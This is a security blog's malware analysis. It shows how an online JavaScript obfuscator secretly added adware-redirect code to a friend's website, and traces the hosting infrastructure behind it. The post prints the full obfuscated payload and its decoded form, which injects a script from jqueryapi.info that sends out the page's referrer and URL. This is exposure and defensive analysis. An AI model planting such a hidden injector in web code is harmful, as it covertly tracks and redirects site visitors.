<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
<head>

  <!-- Basic Page Needs -->
  <meta charset="utf-8">
  <title>FuzzySecurity | Game Over: Dolo Malo - JavaScript Adware Exposed</title>
  <meta name="description" content="">
  <meta name="author" content="">

  <!-- CSS Style -->
  <link rel="stylesheet" href="../css/style.css"> 
  
  <!-- Color Skins -->
  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
  
  <!-- Layout Style -->
  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
  
  <!-- Small Icons -->
  <link rel="stylesheet" href="../css/icons.css">  
  
  <!-- SyntaxHighlighter -->
  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>
  
  <!-- Start JavaScript -->
  
    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
	
    <!-- SyntaxHighlighter -->
	<script type="text/javascript" src="../js/shCore.js"></script>
	<script type="text/javascript" src="../js/shBrushJScript.js"></script>
    <script type="text/javascript" src="../js/shBrushVb.js"></script>
    <script type="text/javascript">SyntaxHighlighter.all();</script>
  
  <!-- End JavaScript -->

  <!--[if lt IE 9]>
      <script src="js/html5.js"></script>
  <![endif]-->

  <!-- Favicons -->
  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">

</head>
<body>

  <div id="wrap" class="boxed">

  <header>
    <div class="container clearfix">
    
      <div class="five columns">
        <div class="logo">
        <a href="index.html">
          <img src="../images/logo.png" alt="FuzzySec" />
        </a>
        </div>
      </div><!-- End Logo -->
      
      <div class="eleven columns">
        <nav id="menu" class="navigation">
          <ul id="nav">
            <li><a href="../index.html">Home</a>
            </li>
            <li><a href="../tutorials.html" class="active">Tutorials</a>
            </li>
            <li><a href="../coding.html">Scripting</a>
            </li>
            <li><a href="../exploits.html">Exploits</a>
            </li>
            <li><a href="../links.html">Links</a>
            </li>
            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
          </ul> 
        </nav>
      </div><!-- End Menu -->
      
      
      <div class="sixteen columns"><hr /></div>
      
    </div><!-- End Container -->
  </header><!-- <<< End Header >>> -->
  
  <div class="container clearfix">
  
    <div class="page-columns">
    
    <ul class="breadcrumbs">
      <li><a href="index.html"><span class="icon home gray"></span></a></li>
          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
          <li>Game Over: Dolo Malo - JavaScript Adware Exposed</li>
      </ul>
      
      <!-- section 16 Columns -->
      
      <div class="recent-work gallery clearfix">
      <div class="eighteen columns bottom">
	<div style="height:20px;" align="right">
		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
	</div>
        <h2 class="title">Game Over: Dolo Malo - JavaScript Adware Exposed<span class="line"></span></h2>

      <div class="fourteen columns bottom">
<p>We consider the internet to be a free place without strict rules and restriction. This freedom allows us to rapidly prototype idea's, start up businesses and exchange knowledge with each other in ways not previously thought possible. This freedom, however, has a flip-side. Tech-savvy people, covering a wide range of technical ability, show a natural proclivity for duping unsuspecting people. These scams range from malicious to benign, from highly technical to barely functional.<br /><br />

In this post I will want to share a case study that I recently stumbled into, quite by accident. A friend of mine contacted me about experiencing occasional redirection on his website. As we will see, there was an unlikely culprit for the redirection. Not being an expert of the law, I can't say if this is technically illegal, but I think we will all be able to agree that it is pretty rude and shameless!<br /><br />

Links:<br />
A comprehensive (albeit a bit old) resource on conditional redirection - <a href="http://aw-snap.info/articles/redirects.php">Aw-Snap</a><br />
JSDetox, Javascript malware analysis and deobfuscation - <a href="http://www.relentless-coding.com/projects/jsdetox/">JSDetox</a>
</p><br />

<h2 class="title">OMGWTF is going on?<span class="line"></span></h2>
<p>This whole story started when a friend of mine notified me that users were occasionally being redirected (to adware/malware) on his website. This in itself was difficult to verify as the redirection seemed to happen infrequently and never more than once per session ID. Initially I suspected that the end user was to blame, having installed an evil browser plug-in or something similar. However, we were eventually able to replicate the redirection using an android browser (the User Agent may be a factor).<br /><br />

Having set aside my doubts I started recursively grepping the webroot for anything that could be suspicious. In addition to this I quickly put together a bash one-liner that would diff all the php files and js plugins of the current webroot with backup copies ("diff -bis ..." sanity checks FTW). I was sure something would turn up but ... nothing.<br /><br />

After getting some caffeine into my system I started furiously browsing the website with the android browser (and purging the browser cache for each request **sigh**). I noticed that not all pages were affected by the redirection. Upon closer inspection I noticed a blob of obfuscated javascript code (performing a legitimate function) on each of those pages. As it turns out my friend was using an online obfuscator to hide some inner workings of the javascript code.<br /><br />

Finally the real culprit was in sight, removing the obfuscated blob stopped the redirection. I helped my friend re-encode his javascript using <a href="http://javascriptobfuscator.com/">Javascript Obfuscator</a> (which is a great tool!) and update his web pages.</p>


<h2 class="title">eval( )<span class="line"></span></h2>
<p>At this point I had become curious and was no longer satisfied with merely solving the problem. I wanted to get to the bottom of this force of evil redirection. Let's see if we can figure this cowboy scheme out!<br /><br />

The bad guy: <a href="http://myobfuscate.com/">MyObfuscate</a></p>

    <p>&nbsp;</p>
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/JS_1_Big.png" rel="prettyPhoto[EvilJS]">
          <img src="images/JS_1_Small.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Looks Innocent Enough</p>
      </div>
    
<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<p>For testing purposes I passed some very basic javascript to the obfuscator.</p>

    <div class="main_wrap_support">
<pre class="brush: js;gutter:false;auto-links: false;;">
alert('Test!')</pre>
</div>

<p>What we get back seems (1) disproportionally large to the input and (2) is obviously not in a human-readable format.</p>

    <div class="main_wrap_support">
<pre class="brush: js;gutter:false;auto-links: false;;">
var lOO='=oQKpkyJ8dCK0lGbwNnLnw3bm5Wa8NmczRXZnx3NywnclJnclZWZyxXZwF2YzVmb1xHZslGaDRmblBHchxXZwF2YzV2X8xmc1xXawFWey
VWdxpGflRXaydHf4IDfmVmc8t2b8RnbJV2cyFGc8BHd0hGf05WZtVGbFVGdhVmcjxHdzVGV3IDfkFWZoxXZtFmTnFGV5J0c05WZtVGbFRXZnxHTSVF
f0BXayN2cDNDf0JXZsFWRzwnchZHfFNDfPBDb8Rnbl1Wdj9GZ8RHcpJ3Yzx3MzwnN3wnNzwXZk92QyFGaD12byZGf1MDfyYDfw8UMfx3QzwHduVmbv
BXbvNUSSVVZk92YuVGfjJ3c8ljM8dmbpJHdTx3Zulmc0N1b0xHc4V0ZlJFf0lGbwNHfsFmdlx3dl5GfmlGflxWaodHflNWYsBXZyxnbyVHdlJHfu9W
a0Nmb1ZGf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHfnwiNy
EDLyYDLnkSK9tHLwwSKnwFfnwFKsFjLnwVTxwHcxwXMyw3TxwXUxw3SxwnSxwnRxw3RxwHSxwXSxwHUxwHVxwHWxwHMywnWxwXWxwnVxwnUxw3Vxw3
UxwXVxwHTxwHbxwHaxwXZxwXaxw3ZxwnZxwnbxwXbxwnaxw3axwncxwXcxw3cxwHRxwXQxwHdxwnQxw3QxwXRxwnexwHf8xHf8xHf8xHf8xHf8xHf8
xHf8xHf8xHf8xHf8xHf8dCXskXMsUXMscCXpkSKnwFXcx3JcxFXoElLnwFXcpFfwEDfxEDfyEDfZxHNxwHV8VFfWx3V8NTM8dTM8FWM8NWM8JWM8RW
M8hTM8lTM8VTM8ZTM8hFfSxHR8VEfGx3Q8NFfHxnQ8lHf6xXQ8dCXcxFL4xCescCXcx1OpkiNoAHKv5SM7kiMo4mL0sTXwsVKnwFXcxFXcxFbnwFXc
xFXcxFKt5SM9QDIzsTKy5SMoUzKnwFXcxFXcxVP1ZyJcxFXcxFXctSK25SMoUzKnwFXcxFXcxVP0ZyJcxFXcxFXctyJcxFXcxFXctWPz9zL35Scv8i
OodCXcxFXcxFX9gjLysTKnwFXcxFXcx1NnwFXcxFXcxFKi5SM9IDIzszJcxFXcxFXcFWJ38SOloWJjVSalcWJmVCZlUWJnwFXcxFXcxVP2AyMnwFXc
hSfwBCT91XKdN2WrxSKnwFXcd2JcxFXscCXcxlYcxFXcxFXcx1JcxFXrkSYoskLjtyJcxFXixFXcxFXcxFXnwFXchiSgkEKN5Cc9A3ep01YbtGKOtX
Kt0yYoA1epQGLlxyasMGLhxCco8EKIdCXo0HcgYWM91XKdN2WrxSKnw1ZnwFLnwlYcxFXcdCXrkyYoU2KnwlYcxFXcdCXo0WMgoWMocWMuAXPwtXKd
N2WrhSaxsXKt0yYogWM70XM9M2O9dCXrcHXcxFXnwlZxsXKoUWM9U2Od1XXltFZgYWM7lSZoUWMb1za9lyYoUGf811YbtWPdlyYoU2WktXKt0yYogW
M7lSKvFDLv41LocWMucCXnwVIokWM70XKpgXMo4WMuMmOpAXMrMGK3FjLvFzP2FjPpEWJj1zYogyKpkSKh9yYo4UMoUmOnw1Jc9TY8MGKmFzepMGKl
FTPltXKkxSZssGLjxSYsAHKlFDKrFzJo0Hcg4mc1RXZy1Xfp01YbtGLpcyZnwyJixFXnsSKjhSZrciYcx1JoAHeFdWZSBydl5GKlNWYsBXZy5Cc9A3
ep01YbtGKml2ep0SLjhSZslGa3tTfpkiNzgyZulmc0N1b05yY6kSOysyYoUGZvNkchh2Qt9mcm5yZulmc0N1P1MjPpEWJj1zYogyKpkSKh9yYoQnbJ
V2cyFGcoUmOncyPhxzYo4mc1RXZytXKjhibvlGdj5Wdm1TZ7lCZsUGLrxyYsEGLwhibvlGdj5WdmhCbhZXZ';function I1I(data){var IlllOI
="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';do{h
1=IlllOI.indexOf(data.charAt(i++));h2=IlllOI.indexOf(data.charAt(i++));h3=IlllOI.indexOf(data.charAt(i++));h4=Illl
OI.indexOf(data.charAt(i++));bits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bit
s&0xff;if(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fr
omCharCode(o1,o2,o3)}}while(i&lt;data.length);return enc} function Ill(string){ var ret = '', i = 0;	for ( i = 
string.length-1; i >= 0; i-- ){ ret += string.charAt(i);} return ret; }eval(I1I(Ill(lOO)));</pre>
</div>

<p>To analyse this code I used <a href="http://www.relentless-coding.com/projects/jsdetox/">JSDetox</a>. This tool is written in ruby, it supports HTML DOM emulation and, from the samples I tested, it is pretty proficient at deobfuscating javascript. Alternatively, if you need a portable Windows solution, you can also have a look at <a href="http://malzilla.sourceforge.net/index.html">Malzilla</a>. Malzilla is a bit on the older side but still has plenty of very useful features!<br /><br />

We can quickly prettify the code and rename the variables, mind you, this does not improve the readability very much!</p>

    <div class="main_wrap_support">
<pre class="brush: js;gutter:false;auto-links: false;;">
function Var1(data){

  var Var2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
  
  do {
    h1 = Var2.indexOf(data.charAt(i++));
    h2 = Var2.indexOf(data.charAt(i++));
    h3 = Var2.indexOf(data.charAt(i++));
    h4 = Var2.indexOf(data.charAt(i++));
    bits = h1 &lt;&lt; 18 | h2 &lt;&lt; 12 | h3 &lt;&lt; 6 | h4;
    o1 = bits >> 16 & 255;
    o2 = bits >> 8 & 255;
    o3 = bits & 255;
    if(h3 == 64) {
      enc += String.fromCharCode(o1);
    } else if(h4 == 64) {
      enc += String.fromCharCode(o1, o2);
    } else {
      enc += String.fromCharCode(o1, o2, o3);
    }
  } while(i &lt; data.length);
  
  return enc;
}

function Var3(string){
  var ret = '', i = 0;
  for(i = string.length - 1; i >= 0; i--) {
    ret += string.charAt(i);
  }
  return ret;
}

eval(Var1(Var3('=oQKpkyJ8dCK0lGbwNnLnw3bm5Wa8NmczRXZnx3NywnclJnclZWZyxXZwF2YzVmb1xHZslGaDRmblBHchxXZwF2YzV2X8xmc1x
XawFWeyVWdxpGflRXaydHf4IDfmVmc8t2b8RnbJV2cyFGc8BHd0hGf05WZtVGbFVGdhVmcjxHdzVGV3IDfkFWZoxXZtFmTnFGV5J0c05WZtVGbFRXZ
nxHTSVFf0BXayN2cDNDf0JXZsFWRzwnchZHfFNDfPBDb8Rnbl1Wdj9GZ8RHcpJ3Yzx3MzwnN3wnNzwXZk92QyFGaD12byZGf1MDfyYDfw8UMfx3Qzw
HduVmbvBXbvNUSSVVZk92YuVGfjJ3c8ljM8dmbpJHdTx3Zulmc0N1b0xHc4V0ZlJFf0lGbwNHfsFmdlx3dl5GfmlGflxWaodHflNWYsBXZyxnbyVHd
lJHfu9Wa0Nmb1ZGf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8xHf8x
HfnwiNyEDLyYDLnkSK9tHLwwSKnwFfnwFKsFjLnwVTxwHcxwXMyw3TxwXUxw3SxwnSxwnRxw3RxwHSxwXSxwHUxwHVxwHWxwHMywnWxwXWxwnVxwnU
xw3Vxw3UxwXVxwHTxwHbxwHaxwXZxwXaxw3ZxwnZxwnbxwXbxwnaxw3axwncxwXcxw3cxwHRxwXQxwHdxwnQxw3QxwXRxwnexwHf8xHf8xHf8xHf8x
Hf8xHf8xHf8xHf8xHf8xHf8xHf8dCXskXMsUXMscCXpkSKnwFXcx3JcxFXoElLnwFXcpFfwEDfxEDfyEDfZxHNxwHV8VFfWx3V8NTM8dTM8FWM8NWM
8JWM8RWM8hTM8lTM8VTM8ZTM8hFfSxHR8VEfGx3Q8NFfHxnQ8lHf6xXQ8dCXcxFL4xCescCXcx1OpkiNoAHKv5SM7kiMo4mL0sTXwsVKnwFXcxFXcx
FbnwFXcxFXcxFKt5SM9QDIzsTKy5SMoUzKnwFXcxFXcxVP1ZyJcxFXcxFXctSK25SMoUzKnwFXcxFXcxVP0ZyJcxFXcxFXctyJcxFXcxFXctWPz9zL
35Scv8iOodCXcxFXcxFX9gjLysTKnwFXcxFXcx1NnwFXcxFXcxFKi5SM9IDIzszJcxFXcxFXcFWJ38SOloWJjVSalcWJmVCZlUWJnwFXcxFXcxVP2A
yMnwFXchSfwBCT91XKdN2WrxSKnwFXcd2JcxFXscCXcxlYcxFXcxFXcx1JcxFXrkSYoskLjtyJcxFXixFXcxFXcxFXnwFXchiSgkEKN5Cc9A3ep01Y
btGKOtXKt0yYoA1epQGLlxyasMGLhxCco8EKIdCXo0HcgYWM91XKdN2WrxSKnw1ZnwFLnwlYcxFXcdCXrkyYoU2KnwlYcxFXcdCXo0WMgoWMocWMuA
XPwtXKdN2WrhSaxsXKt0yYogWM70XM9M2O9dCXrcHXcxFXnwlZxsXKoUWM9U2Od1XXltFZgYWM7lSZoUWMb1za9lyYoUGf811YbtWPdlyYoU2WktXK
t0yYogWM7lSKvFDLv41LocWMucCXnwVIokWM70XKpgXMo4WMuMmOpAXMrMGK3FjLvFzP2FjPpEWJj1zYogyKpkSKh9yYo4UMoUmOnw1Jc9TY8MGKmF
zepMGKlFTPltXKkxSZssGLjxSYsAHKlFDKrFzJo0Hcg4mc1RXZy1Xfp01YbtGLpcyZnwyJixFXnsSKjhSZrciYcx1JoAHeFdWZSBydl5GKlNWYsBXZ
y5Cc9A3ep01YbtGKml2ep0SLjhSZslGa3tTfpkiNzgyZulmc0N1b05yY6kSOysyYoUGZvNkchh2Qt9mcm5yZulmc0N1P1MjPpEWJj1zYogyKpkSKh9
yYoQnbJV2cyFGcoUmOncyPhxzYo4mc1RXZytXKjhibvlGdj5Wdm1TZ7lCZsUGLrxyYsEGLwhibvlGdj5WdmhCbhZXZ')));</pre>
</div>

<p>Now we can get to the real magic! JSDetox can run the code and, in this case, breakpoints are placed on eval's to extract the decrypted code. Low and behold, one of the eval's reveals our original alert box and ... something else!</p>

    <p>&nbsp;</p>
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/JS_2_Big.png" rel="prettyPhoto[EvilJS]">
          <img src="images/JS_2_Small.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>eval( )</p>
      </div>
    
<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<p>Let's rename the variables and have a closer look at what is actually executed by the obfuscated javascript code.</p>

    <div class="main_wrap_support">
<pre class="brush: js;gutter:false;auto-links: false;;">
// -=Generates evil URL=-
// encodeURIComponent: This function encodes special characters (including , / ? : @ & = + $ #).
// document.referrer = Returns the URI of the page that linked to this page.
// document.URL = Returns the string URL of the HTML document.
var EvilRequest = document.createElement('script');
EvilRequest.src = "http://jqueryapi.info/?getsrc=ok&ref=" + encodeURIComponent(document.referrer)
+ '&url=' + encodeURIComponent(document.URL);

// -=Injects URL=-
// HeaderEdit: Grabs the &lt;head> element of the page.
// appendChild(EvilRequest): Appends the EvilRequest script element to &lt;head> where it is automatically loaded.
var HeaderEdit = document.getElementsByTagName('head')[0];
HeaderEdit.appendChild(EvilRequest);

// -=Executes our initial code=-
// Finally document.write is used to execute the legitemate javascript (in this case "alert('Test!')").
document.write(unescape('%3Cscript%3Ealert%28%27Test%21%27%29%3C/script%3E'));</pre>
</div>

<p>We can easily verify this by creating an html page that contains the obfuscated javascript, drop it on our local webserver and intercept the request with a proxy. We can see from the screenshots below that our "harmless" javascript is trying to phone home!</p>

    <p>&nbsp;</p>
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/JS_3_Big.png" rel="prettyPhoto[EvilJS]">
          <img src="images/JS_3_Small.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Burpsuite</p>
      </div>
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/JS_4_Big.png" rel="prettyPhoto[EvilJS]">
          <img src="images/JS_4_Small.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          <p>Phone Home</p>
      </div>
    
<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<h2 class="title">But wait...<span class="line"></span></h2>
<p>There is still one more chapter to this story. After deciphering the javascript I wanted to have a look at the "jqueryapi.info" domain. Though the whois information is mostly useless we can establish that the domain was set up recently.</p><br />

    <div class="terminal_wrap" style="background:#CCC">
<pre><span style='color:#ff0000;'>root@darkside</span>:~# <span style='color:#2B8156;'>whois jqueryapi.info |egrep 'Creation|Expiry|Registrant'</span>

Creation Date: 2014-02-28T06:26:23Z
Registry Expiry Date: 2015-02-28T06:26:23Z
Registrant ID:CR162077161
Registrant Name:Registration Private
Registrant Organization:Domains By Proxy, LLC
Registrant Street: DomainsByProxy.com
Registrant City:Scottsdale
Registrant State/Province:Arizona
Registrant Postal Code:85260
Registrant Country:US
Registrant Phone:+1.4806242599
Registrant Phone Ext: 
Registrant Fax: +1.4806242598
Registrant Fax Ext: 
Registrant Email:JQUERYAPI.INFO@domainsbyproxy.com</pre>
<br />
</div>

<p>&nbsp;</p>
<p>Doing some quick enumeration we can actually see that the server hosting "jqueryapi.info" is located in Russia.</p><br />

    <div class="terminal_wrap" style="background:#CCC">
<pre><span style='color:#ff0000;'>root@darkside</span>:~# <span style='color:#2B8156;'>host -t any jqueryapi.info</span>

jqueryapi.info has address 188.64.170.17
jqueryapi.info has SOA record ns73.domaincontrol.com. dns.jomax.net. 2014022702 28800 7200 604800 600
jqueryapi.info name server ns74.domaincontrol.com.
jqueryapi.info name server ns73.domaincontrol.com.

<span style='color:#ff0000;'>root@darkside</span>:~# <span style='color:#2B8156;'>dig -x 188.64.170.17</span>

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> -x 188.64.170.17
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16578
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;17.170.64.188.in-addr.arpa.    IN      PTR

;; ANSWER SECTION:
17.170.64.188.in-addr.arpa. 604800 IN   PTR     h1net188-64-170-17.h1host.ru.

;; Query time: 756 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Mon Jul  7 07:42:29 2014
;; MSG SIZE  rcvd: 86</pre>
<br />
</div>

<p>&nbsp;</p>
<p>The really interesting part came when I did a reverse IP lookup on the domain to find out which other websites are hosted on the same server. These results can be replicated at <a href="http://viewdns.info/">ViewDNS</a>.</p><br />

    <div class="terminal_wrap" style="background:#CCC">
<pre>Reverse IP results for jqueryapi.info (188.64.170.17)
==============

There are 21 domains hosted on this server.
The complete listing of these is below:

Domain	                          Last Resolved Date
april-broker.com                  2013-12-20
htmlobfuscator.com                2014-05-17
htmlobfuscator.info               2014-07-01
javascript-obfuscator.info        2014-07-01
javascriptcompressor.info         2014-07-01
javascriptcrambler.com	          2014-05-17
javascriptobfuscate.com	          2014-05-17
javascriptobfuscator.info         2014-07-01
jqueryapi.info	                  2014-07-06
myobfuscate.com	                  2014-05-17
obfuscatorjavascript.com          2014-05-17
obfuscatorjavascript.info         2014-07-01
promebel21.ru	                  2014-05-27
screendepo.com	                  2014-05-17
softtrade.ru	                  2014-05-27
statistick.info	                  2014-07-01
statisticu.info	                  2014-07-01
statisticy.info	                  2014-07-01
statistiki.info	                  2014-07-01
statistiq.info	                  2014-07-01
statistiqa.info	                  2014-07-01</pre>
<br />
</div>

<p>&nbsp;</p>
<p>We should all be smiling and/or frowning at this point as there are some, obviously, suspect domains on that list. I had a quick look and all of the "obfuscate" domains are perfect clones. The finer points of this scam are pretty clear now! There are (1) domains that generate obfuscated code, this code seeds the adware process. Browsers that load the code make requests to (2) other domains, hosted on the same server, which act as a go-between to point the browser at adware/malware websites!</p>

<h2 class="title">Game Over<span class="line"></span></h2>
<p>We have come full circle with this case study. We went from detecting the redirection to understanding the delivery method of the attack and finally linking the adware back to obfuscator (even discovering additional infrastructure along the way). I think this is a typical example of the kind of mid-tier scams that are so prevalent on the internet.<br /><br />

For posterity I want to include the following links:<br />
Wepawet analysis of the javascript code - <a href="http://wepawet.iseclab.org/view.php?hash=0ca9773cabfb5d3589ffc39cca460bef&type=js">here</a><br />
Information gathered by VirusTotal on "jqueryapi.info" - <a href="https://www.virustotal.com/en/domain/jqueryapi.info/information/">here</a></p><p>&nbsp;</p><p>&nbsp;</p>

<p style="text-align:center"><img src="images/JS_5_Big.png" alt=""/></p>

</div>
    </div>
</div>
      
      <!-- End  -->
    	</div>    
    </div><!-- End page-columns -->
     
         <div align="center"><script>
           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
           var idcomments_post_id;
           var idcomments_post_url;
           </script>
             <span id="IDCommentsPostTitle" style="display:none"></span>
           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
         </div>
     
  </div><!-- <<< End Container >>> -->
  
  <footer>
    <div class="container">
    
      
      <div class="six columns"><span class="copyright">
      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
      
      <div class="six columns">
        
          <p><a href="../index.html">Home</a> |
          <a href="../tutorials.html">Tutorials</a> |
          <a href="../coding.html">Scripting</a> |
          <a href="../exploits.html">Exploits</a> |
          <a href="../links.html">Links</a> |
          <a href="../contact.html">Contact</a></p>
        
      </div>
    
    </div><!-- End container -->
  </footer><!-- <<< End Footer >>> -->
  
  </div><!-- End wrap -->
  
  <!-- Start Style Switcher -->
  <div class="switcher"></div>
  <!-- End Style Switcher -->
    
</body>
</html>